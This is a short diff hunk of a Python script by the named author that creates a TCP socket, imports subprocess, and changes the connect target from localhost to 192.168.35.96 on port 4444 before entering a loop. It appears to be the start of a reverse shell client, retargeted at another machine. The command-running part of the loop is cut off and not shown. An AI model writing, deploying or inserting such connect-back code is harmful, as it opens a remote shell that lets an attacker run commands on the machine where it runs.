@@ -8,7 +8,7 @@ import subprocess
 __author__ = "Maillard Alexandre"
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("127.0.0.1",4444))
+s.connect(("192.168.35.96",4444))
 
 while True:
     try:
